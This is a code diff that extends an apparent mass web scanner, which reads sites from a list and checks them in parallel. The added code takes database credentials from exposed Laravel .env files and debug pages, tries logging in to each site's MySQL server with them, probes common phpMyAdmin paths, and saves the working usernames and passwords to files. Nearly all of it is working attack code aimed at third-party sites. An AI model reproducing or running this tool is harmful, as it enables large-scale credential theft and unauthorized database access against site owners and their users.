@@ -1,4 +1,6 @@
 import requests
+import re
+import pymysql
 from concurrent.futures import ThreadPoolExecutor
 
 def ensure_http_prefix(url):
@@ -29,15 +31,19 @@ def check_and_save(url, keyword, result_file):
     try:
         response = requests.get(url, timeout=10)
         
-        if response.history:  # Redirect check
+        if response.history:
             print(f'{url} redirected to {response.url}, marking as invalid.')
             return False
         
         if response.status_code == 200:
-            if keyword in response.text:
+            if keyword is None or keyword in response.text:
                 with open(result_file, 'a') as f:
                     f.write(f'Keyword "{keyword}" found in {url}\n')
                 print(f'Keyword "{keyword}" found in {url} and saved to {result_file}')
+                
+                if keyword == "APP_KEY=":
+                    process_database_extraction(response, url)
+
                 return True
             else:
                 print(f'Keyword "{keyword}" not found in {url}, marking as invalid.')
@@ -67,10 +73,78 @@ def check_debug_laravel(url):
             with open("result_debuglaravel2025.txt", "a") as f:
                 f.write(f"{url} has Laravel debug info (APP_KEY leak)\n")
             print(f"[+] Laravel debug exposed at {url}")
+            process_database_extraction(isReq, url)
     except requests.exceptions.RequestException as e:
         print(f"Error checking Laravel debug at {url}: {e}")
 
     return response_text
+
+def extract_db_credentials(text):
+    credentials = {}
+    patterns = {
+        'DB_HOST': r'DB_HOST\s*=\s*([^\s\n]+)',
+        'DB_USERNAME': r'DB_USERNAME\s*=\s*([^\s\n]+)',
+        'DB_PASSWORD': r'DB_PASSWORD\s*=\s*([^\s\n]+)',
+    }
+    for key, pattern in patterns.items():
+        match = re.search(pattern, text)
+        if match:
+            credentials[key] = match.group(1).strip(' "\'')
+
+    return credentials
+
+def try_connect_db(host, user, password):
+    try:
+        conn = pymysql.connect(
+            host=host,
+            user=user,
+            password=password,
+            connect_timeout=5
+        )
+        conn.close()
+        return True
+    except Exception as e:
+        print(f"Gagal konek ke DB: {host} - {e}")
+        return False
+
+def check_phpmyadmin(url, db_user, db_pass):
+    phpmyadmin_paths = [
+        "/phpmyadmin", "/pma", "/dbadmin", "/phpMyAdmin", "/mysql"
+    ]
+    for path in phpmyadmin_paths:
+        full_url = url.rstrip('/') + path
+        try:
+            r = requests.get(full_url, timeout=8)
+            if '<a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F"' in r.text:
+                with open("result_phpmyadmin.txt", "a") as f:
+                    f.write(f"{url} has phpMyAdmin | User: {db_user} | Pass: {db_pass}\n")
+                print(f"[+] phpMyAdmin found at {full_url}")
+                return True
+        except Exception as e:
+            print(f"Error checking phpMyAdmin on {full_url}: {e}")
+    return False
+
+def process_database_extraction(response_text, target_url):
+    if not response_text:
+        return
+
+    creds = extract_db_credentials(response_text.text if hasattr(response_text, 'text') else response_text)
+    if not creds:
+        return
+
+    db_host = creds.get('DB_HOST', '')
+    db_user = creds.get('DB_USERNAME', '')
+    db_pass = creds.get('DB_PASSWORD', '')
+
+    if db_host in ['127.0.0.1', 'localhost'] and db_user and db_pass:
+        domain = target_url.replace('http://', '').replace('https://', '').split('/')[0]
+        print(f"[*] Testing remote DB using domain: {domain}")
+        if try_connect_db(domain, db_user, db_pass):
+            with open("result_database_remote.txt", "a") as f:
+                f.write(f"{target_url} => Remote DB OK | USER: {db_user} | PASS: {db_pass}\n")
+            print(f"[+] Remote DB access success for {domain}")
+
+        check_phpmyadmin(target_url, db_user, db_pass)
 
 def process_website(website, paths_to_check):
     full_url = ensure_http_prefix(website)
@@ -141,12 +215,10 @@ def main():
     ]
 
     websites = read_websites('list.txt')
-
     max_threads = 10
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [executor.submit(process_website, website, paths_to_check) for website in websites]
-
         for future in futures:
             future.result()
 
